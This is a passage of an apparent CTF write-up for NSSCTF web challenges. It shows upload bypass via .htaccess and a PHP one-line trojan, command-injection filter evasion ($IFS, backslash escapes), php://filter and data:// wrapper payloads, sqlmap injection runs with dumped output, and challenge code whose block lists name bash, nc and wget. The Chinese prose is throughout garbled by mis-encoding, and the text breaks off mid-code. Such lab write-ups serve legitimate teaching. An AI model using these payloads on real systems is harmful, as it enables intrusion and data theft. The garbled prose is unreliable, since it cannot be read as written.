src="bce1b958ab13d6b3b5372cf0549a7e1d.png" alt="bce1b958ab13d6b3b5372cf0549a7e1d.png" /><p>åŸä¾†flagåœ¨é€™FLAG&#x3D;NSSCTF{58c4de5b-6a3f-4dbc-8332-16ad44d25a11}</p><h2 id="6-easyupload2-0"><a href="#6-easyupload2-0" class="headerlink" title="6.easyupload2.0"></a>6.easyupload2.0</h2><p>é€™ä¸€æ¬¡çš„éæ¿¾æ˜¯åœ¨å¾Œå°çš„,æ‰€ä»¥æˆ‘è¦æƒ³è¾¦æ³•å»åšä¸€å€‹phpå¾Œç¶´ç¹é, æˆ‘ç”¨äº†deepseekå¯«äº†ä¸€å€‹å­—å…¸</p><img src="a15c6720f893ee3fb529a4d60f902821.png" alt="a15c6720f893ee3fb529a4d60f902821.png" /><p>,å…ˆå»æŠ“åŒ…é€å»Intruder</p><img src="7caeb4abdc3ba54e9a49950c3d72e9a2.png" alt="7caeb4abdc3ba54e9a49950c3d72e9a2.png" /><p>æŠŠJPG$ç‚ºpayload å¹¶æ’å…¥å­—å…¸,é–‹å§‹çˆ†ç ´ , çœ‹çœ‹Length 427 çš„Response  æ˜¯æˆåŠŸçš„ , é€²å»çœ‹çœ‹</p><img src="1dcc7c64b305fb28dfd58799daf0e827.png" alt="1dcc7c64b305fb28dfd58799daf0e827.png" /><p>æŸ¥ä¸€ä¸‹flagçš„ä½å­,å¾—å‡º flag : NSSCTF{9f5d5750-9a19-48c1-b41f-51d2db3e66a5}</p><img src="3bf6c15c0fc603e58634a61f1c81d911.png" alt="3bf6c15c0fc603e58634a61f1c81d911.png" /><h2 id="7-easyupload3-0"><a href="#7-easyupload3-0" class="headerlink" title="7.easyupload3.0"></a>7.easyupload3.0</h2><p>åˆ©ç”¨.htaccessè¿›è¡Œç»•è¿‡</p><p>.htaccess æ˜¯ä¸€ä¸ªç”¨äºé…ç½® Apache web æœåŠ¡å™¨çš„åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼Œå…¨ç§°ä¸º Hypertext Accessï¼ˆè¶…æ–‡æœ¬è®¿é—®ï¼‰ã€‚å®ƒå…è®¸ç½‘ç«™ç®¡ç†å‘˜åœ¨ä¸ä¿®æ”¹æœåŠ¡å™¨ä¸»é…ç½®æ–‡ä»¶ï¼ˆå¦‚ httpd.confï¼‰çš„æƒ…å†µä¸‹ï¼Œå¯¹ç‰¹å®šç›®å½•åŠå…¶å­ç›®å½•çš„æœåŠ¡å™¨è¡Œä¸ºè¿›è¡Œè®¾ç½®ï¼Œå…·æœ‰çµæ´»æ€§é«˜ã€é’ˆå¯¹æ€§å¼ºçš„ç‰¹ç‚¹ã€‚<br>.htaccess çš„æ ¸å¿ƒä½œç”¨<br>.htaccess æ–‡ä»¶ä¸»è¦ç”¨äºè¦†ç›– Apache ä¸»é…ç½®ä¸­çš„é»˜è®¤è§„åˆ™ï¼Œå®ç°å¯¹ç›®å½•çº§åˆ«çš„ç²¾ç»†åŒ–æ§åˆ¶ï¼Œå¸¸è§åŠŸèƒ½åŒ…æ‹¬ï¼š</p><p>URL é‡å†™ï¼ˆå¦‚å°†åŠ¨æ€ URL è½¬æ¢ä¸ºé™æ€å‹å¥½çš„å½¢å¼ï¼‰ã€‚<br>è®¿é—®æ§åˆ¶ï¼ˆé™åˆ¶ç‰¹å®š IP æˆ–ç”¨æˆ·è®¿é—®ï¼‰ã€‚<br>è‡ªå®šä¹‰é”™è¯¯é¡µé¢ï¼ˆå¦‚ 404ã€500 é”™è¯¯é¡µï¼‰ã€‚<br>ç¼“å­˜è®¾ç½®ï¼ˆæ§åˆ¶æµè§ˆå™¨æˆ–æœåŠ¡å™¨ç¼“å­˜ç­–ç•¥ï¼‰ã€‚<br>å®ç° HTTPS å¼ºåˆ¶è·³è½¬ã€‚<br>æ–‡ä»¶ç±»å‹å…³è”ï¼ˆå¦‚è®¾ç½®ç‰¹å®šæ‰©å±•åçš„ MIME ç±»å‹ï¼‰ç­‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;xiaoma.jpg&quot;</span>&gt;</span><br><span class="line"><span class="title class_">SetHandler</span> application/x-httpd-php</span><br><span class="line">&lt;/<span class="title class_">FilesMatch</span>&gt;</span><br><span class="line"></span><br><span class="line"># <span class="title class_">SetHandler</span> æŒ‡ä»¤å¼ºåˆ¶æŒ‡å®šæ–‡ä»¶çš„å¤„ç†ç¨‹åº</span><br><span class="line"># è¿™é‡Œå°† <span class="string">&quot;xiaoma.jpg&quot;</span> äº¤ç»™ <span class="variable constant_">PHP</span> å¤„ç†å™¨ï¼ˆapplication/x-httpd-phpï¼‰å¤„ç†</span><br><span class="line"># å³æœåŠ¡å™¨ä¼šæŠŠè¿™ä¸ªå›¾ç‰‡æ–‡ä»¶å½“ä½œ <span class="variable constant_">PHP</span> è„šæœ¬æ‰§è¡Œï¼Œè€Œéç›´æ¥è¿”å›å›¾ç‰‡å†…å®¹</span><br></pre></td></tr></table></figure><p>å…ˆæŠ“å€‹åŒ…å…ˆ , ä¸Šå‚³ä¸€å¥è©±æœ¨é¦¬.jpg </p><img src="d0945bcbaab0944101929114cf63e9fd.png" alt="d0945bcbaab0944101929114cf63e9fd.png" /><p>è©¦è©¦ç”¨çˆ†ç ´ä¸€ä¸‹</p><img src="cf2ed89b24dabe2d073d1d63eb2ea044.png" alt="cf2ed89b24dabe2d073d1d63eb2ea044.png" /><p>æœ€å¾Œåªæœ‰htaccessæˆåŠŸ , ç¾åœ¨å‚³å…¥.htaccess è…³æœ¬ </p><img src="730c04915892ed223f0bd9593c7b1554.png" alt="730c04915892ed223f0bd9593c7b1554.png" /><p>åœ¨&#x2F;upload çœ‹çœ‹ ã€‚</p><img src="1e867f19185207051fe9f6a1dd1c5845.png" alt="1e867f19185207051fe9f6a1dd1c5845.png" /><img src="24b764ecf857a0859dab633a4199f957.png" alt="24b764ecf857a0859dab633a4199f957.png" /><p>çš„ç¢ºæ˜¯åŸ·è¡Œäº†phpinfo.php</p><img src="5a6553d967a2946298da259ca46dc083.png" alt="5a6553d967a2946298da259ca46dc083.png" /><p>NSSCTF{6b9d4421-ffc6-4432-b2d8-9f4b8e88c96c}</p><br/><h2 id="8-finalrce"><a href="#8-finalrce" class="headerlink" title="8.finalrce"></a>8.finalrce</h2><br/><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $url=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">preg_match</span>(<span class="string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,$url))</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;Can you see anything?&quot;</span>;</span><br><span class="line">        <span class="title function_">exec</span>($url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(1)é€™è£¡çš„ä»£ç¢¼èªªæ˜GET url ä¸èƒ½æ˜¯ â€œbash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|-|*|&quot;|&gt;|&lt;|%|$&#x2F;i â€œ </p><p>(2) exec() æ²’æœ‰å›é¡¯ , </p><pre><code> exec()</code></pre><p>åŸå‹ï¼šstring exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</p><p>è¯´æ˜ï¼š</p><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ $command æ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š â€œls -lâ€</p><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œ$output æ˜¯commandæ‰§è¡Œè¾“å‡ºçš„ç»“æœï¼Œä»¥æ•°ç»„æ ¼å¼å­˜å‚¨</p><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œ$return_varï¼Œç”¨äºä¿å­˜commandæ‰§è¡ŒçŠ¶æ€ï¼Œ0 - æˆåŠŸï¼Œéé›¶ - å¤±è´¥</p><p>è¿”å›å€¼ï¼Œä¸ºcommandæ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œ</p><p>å¯åƒè€ƒé€™ç¯‡æ–‡ç« ï¼š</p><p><a href="https://">https://blog.csdn.net/afei__&#x2F;article&#x2F;details&#x2F;81901296</a></p><p>teeå‘½ä»¤:Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶ã€‚</p><p>ç®¡é“ç¬¦å· <code>|</code>ï¼ˆç«–çº¿ï¼‰è¡¨ç¤ºå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºâ€ä¼ é€’â€ç»™ä¸‹ä¸€ä¸ªå‘½ä»¤ä½œä¸ºè¾“å…¥ã€‚</p><p>é–‹å•Ÿhackbar æ‰“å‡º ? url &#x3D; l\s &#x2F; | tee test.txt , ç„¶å¾Œ &#x2F;test.txt å¯çœ‹è¦‹ </p><img src="168505fbf862b1d969ee44775210bd39.png" alt="168505fbf862b1d969ee44775210bd39.png" /><p>æœ‰å…©å€‹åƒæ˜¯flagçš„æ±è¥¿ a_here_is_a_f1ag  å’Œ flllllaaaaaaggggggg , </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?url=tac  /flllll\aaaaaaggggggg | tee <span class="number">1.</span>txt</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è½¬ä¹‰ç¬¦å¯ç¹éæª¢æ¸¬ </p><p>ç„¶å¾Œ &#x2F;1.txt å¯çœ‹è¦‹ </p><img src="e96cb7f0490a1c2838e6149640b03463.png" alt="e96cb7f0490a1c2838e6149640b03463.png" /><p>NSSCTF{2b9d7dde-7f03-4a7f-9664-8a623ff22553}</p><h2 id="9-PseudoProtocols"><a href="#9-PseudoProtocols" class="headerlink" title="9. PseudoProtocols"></a>9. PseudoProtocols</h2><p><a href="https://">https://blog.csdn.net/IDHALASHAO/article/details/130368938</a></p><p>PHPä¼ªåè®®</p><p>å¯ä»¥ç”¨</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">php</span>:<span class="comment">//filter/read=convert.base64-encode/resource=hint.php</span></span><br></pre></td></tr></table></figure><p>ä»¥base64encode å½¢å¼å»è¼¸å‡º</p><img src="24c0e5759f9d1c2eac63161ba8532905.png" alt="24c0e5759f9d1c2eac63161ba8532905.png" /><p>base64 è§£ç¢¼ç‚ºï¼š</p><img src="5b9d7541f10767a5bbdd79b40a93ee1e.png" alt="5b9d7541f10767a5bbdd79b40a93ee1e.png" /><br/><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€²å…¥å¾Œç™¼ç¾phpä»£ç¢¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯çŸ¥GET  isset(a) (aå­˜åœ¨) å’Œ  file_get_contents(a,â€™râ€™)è¦åš´æ ¼ &#x3D; â€˜I want flagâ€™  , å¯ä»¥ä½¿ç”¨phphä¼ªåè®® ç”¨data:&#x2F;&#x2F;  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain,I want flag</span><br></pre></td></tr></table></figure><img src="e3ce167eb017d822d02d41ebc6149ac6.png" alt="e3ce167eb017d822d02d41ebc6149ac6.png" /><p>é‚„å¯ä»¥ç”¨base64  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../....php?a=data://text/plain;base64,SSB3YW50IGZsYWc=</span><br></pre></td></tr></table></figure><br/><h2 id="10-ez-ez-php"><a href="#10-ez-ez-php" class="headerlink" title="10.ez_ez_php"></a>10.ez_ez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>è©¦ä¸€è©¦&#x2F;flag.php</p><img src="7a7b62c2eb2672dca08985e521a0a057.png" alt="7a7b62c2eb2672dca08985e521a0a057.png" /><p>çœ‹ä¾†è¦ç”¨phpä¼ªåè®®</p><br/><p>phpä¼ªåè®®</p><p>php:&#x2F;&#x2F;filter&#x2F;<br>è¯»å–åŒ…å«phpä»£ç æ–‡ä»¶å†…å®¹éœ€è¦è¿›è¡ŒæŸç§ç¼–ç è¿›è¡Œè¾“å‡ºï¼Œä¸ç„¶ä¼šå½“ä½œphpä»£ç æ‰§è¡Œå°±æ— æ³•æŸ¥çœ‹æ–‡ç« å†…å®¹</p><h5 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ul><li>allow_url_fopen ï¼šoff&#x2F;on</li><li>allow_url_includeï¼šoff&#x2F;on</li></ul><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=file</span><br></pre></td></tr></table></figure><h5 id="payloadåˆ†æ"><a href="#payloadåˆ†æ" class="headerlink" title="payloadåˆ†æ"></a>payloadåˆ†æ</h5><ul><li><strong>php:&#x2F;&#x2F;filter&#x2F;</strong>ï¼šè¿™æ˜¯ä¸€ä¸ª PHP çš„æµå°è£…å™¨ï¼Œç”¨äºåœ¨è¯»å†™æ•°æ®æ—¶æä¾›è¿‡æ»¤åŠŸèƒ½ã€‚</li><li><strong>read&#x3D;convert.base64-encode&#x2F;</strong>ï¼šè¿™é‡ŒæŒ‡å®šäº†ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå‘Šè¯‰ PHP åœ¨è¯»å–æ•°æ®ä¹‹å‰å°†å…¶è¿›è¡Œ base64 ç¼–ç ã€‚<code>convert.base64-encode</code>æ˜¯ä¸€ä¸ª PHP å†…ç½®çš„è¿‡æ»¤å™¨ï¼Œç”¨äºå°†æ•°æ®è½¬æ¢ä¸º base64 ç¼–ç </li><li><strong>resource&#x3D;file</strong>ï¼šè¿™éƒ¨åˆ†æŒ‡å®šäº†è¦æ“ä½œçš„èµ„æºã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>file</code>è¡¨ç¤ºæˆ‘ä»¬å¸Œæœ›å¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œå…·ä½“æ¥è¯´æ˜¯å¯¹æ–‡ä»¶çš„å†…å®¹è¿›è¡Œ base64 ç¼–ç è¯»å–</li></ul><img src="c8a9a7c8fae6f5aa36de009dc991f1d6.png" alt="c8a9a7c8fae6f5aa36de009dc991f1d6.png" /><img src="7a6c1d02bb09e707d0f779bf765dc29c.png" alt="7a6c1d02bb09e707d0f779bf765dc29c.png" /><p>å†æ”¹ä¸€æ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><img src="f1f266d969b3ca0389251ef3162172a4.png" alt="f1f266d969b3ca0389251ef3162172a4.png" /><img src="52bf506872189284081ce70e94020942.png" alt="52bf506872189284081ce70e94020942.png" /><p>NSSCTF{5c686f83-3496-45b9-9d79-58172f39fb9c}</p><h2 id="11-babyRCE"><a href="#11-babyRCE" class="headerlink" title="11.babyRCE"></a>11.babyRCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$rce</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;rce&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$rce</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\&#x27;|\&quot;/i&quot;</span>, <span class="variable">$rce</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$rce</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hhhhhhacker!!!&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²’æœ‰ls å¯ä»¥?rce&#x3D;ls  , å¦‚ä¸‹</p><img src="4881e43a020115d6c69d266df2bd8107.png" alt="4881e43a020115d6c69d266df2bd8107.png" /><p>å¯æ˜¯ç©ºæ ¼è¢«banäº† å¯æƒ¡å•Š</p><img src="763b8d97fc3c333de1ea22b12041dcb0.png" alt="763b8d97fc3c333de1ea22b12041dcb0.png" /><img src="bcbd7da73f6551422f1dd1948360f09c.png" alt="bcbd7da73f6551422f1dd1948360f09c.png" /><p>çœ‹ä¾†å¯ä»¥ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?rce=rev$IFS./fl\ag.php</span><br></pre></td></tr></table></figure><br/><img src="c7e0c4aa074493852c4e0de14d3b553b.png" alt="c7e0c4aa074493852c4e0de14d3b553b.png" /><p>revä¸€ä¸‹</p><img src="e5a233ee9fed1a3a5c01044d94537910.png" alt="e5a233ee9fed1a3a5c01044d94537910.png" /><p>NSSCTF{0b67ab0f-36eb-4b7a-b2ec-bcd591f56063}</p><h2 id="12-å¯¼å¼¹è¿·è¸ª"><a href="#12-å¯¼å¼¹è¿·è¸ª" class="headerlink" title="12.å¯¼å¼¹è¿·è¸ª"></a>12.å¯¼å¼¹è¿·è¸ª</h2><p>é€™ä¸å¯¦åŠ›å—(bushi~~</p><img src="070744670c7f9ac8af4b8a37ae9fd54b.png" alt="070744670c7f9ac8af4b8a37ae9fd54b.png" /><p>çœ‹çœ‹æœ‰æ²’æœ‰å‘æœå‹™å™¨ç™¼åŒ… ,å¥½åƒæ²’æœ‰</p><img src="dd7b995b2302fc8d981a9b95889b9b1d.png" alt="dd7b995b2302fc8d981a9b95889b9b1d.png" /><p>èªªæ˜ä¸èƒ½æŠ“åŒ…, åªå¥½çœ‹çœ‹æºä»£ç¢¼äº†, æœ€å¾Œåœ¨game.jsæ‰¾åˆ°äº†</p><img src="0a28277e0d4d5d864a3648198b845b02.png" alt="0a28277e0d4d5d864a3648198b845b02.png" /><h2 id="13-caidao"><a href="#13-caidao" class="headerlink" title="13.caidao"></a>13.caidao</h2><p>ä¸€çœ‹å°±çŸ¥é“æ˜¯fuzzäº†, èŸ»åŠå•Ÿå‹•!!!!! wllmç‚ºå¯†ç¢¼ </p><p>æœ€å¾Œåœ¨æ ¹ç›®éŒ„æ‰¾åˆ°flag</p><img src="cef146c06300fd3f89926762c4732a48.png" alt="cef146c06300fd3f89926762c4732a48.png" />## 14.easy_sql<p>å¯ä»¥çœ‹è¦‹åƒæ•¸æ˜¯wllm åœ¨url?wllm&#x3D;1å¾Œ</p><img src="eadfa8156d67834230c0e4a0b51fd586.png" alt="eadfa8156d67834230c0e4a0b51fd586.png" /><p>å…ˆæ‰“é–‹sqlmap ,å…ˆæŸ¥æœ¬æŸ¥æ˜¯å¦æœ‰æ³¨å…¥æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: wllm (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: wllm=1&#x27; AND 3264=3264 AND &#x27;PvdX&#x27;=&#x27;PvdX</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 2246 FROM(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(2246=2246,1))),0x716b626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;tWnq&#x27;=&#x27;tWnq</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: wllm=1&#x27; AND (SELECT 5627 FROM (SELECT(SLEEP(5)))KQyT) AND &#x27;LObx&#x27;=&#x27;LObx</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: wllm=-8611&#x27; UNION ALL SELECT NULL,CONCAT(0x7176766271,0x707a4e734470455a694f714c5377426f56435a6d4447567979594750585254684a71435578684644,0x716b626271),NULL-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>ç”¨sqlmapçˆ†åº«:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 --dbs --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">available databases [5]:</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br><span class="line">[*] test</span><br><span class="line">[*] test_db</span><br></pre></td></tr></table></figure><p>çˆ†table:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --tables --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">[2 tables]</span><br><span class="line">+---------+</span><br><span class="line">| test_tb |</span><br><span class="line">| users   |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹ test_tbçš„å…§å®¹ :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://node7.anna.nssctf.cn:24766/?wllm=1 -D test_db --dump --risk 1 --level 1 --technique BTEU --random-agent --timeout 30 -v 1 --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: test_db</span><br><span class="line">Table: test_tb</span><br><span class="line">[1 entry]</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| id | flag                                         |</span><br><span class="line">+----+----------------------------------------------+</span><br><span class="line">| 1  | NSSCTF&#123;ca97d725-34c3-4a69-b0b9-21a28907ed9f&#125; |</span><br><span class="line">+----+----------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="15-hardrce"><a href="#15-hardrce" class="headerlink" title="15.hardrce"></a>15.hardrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 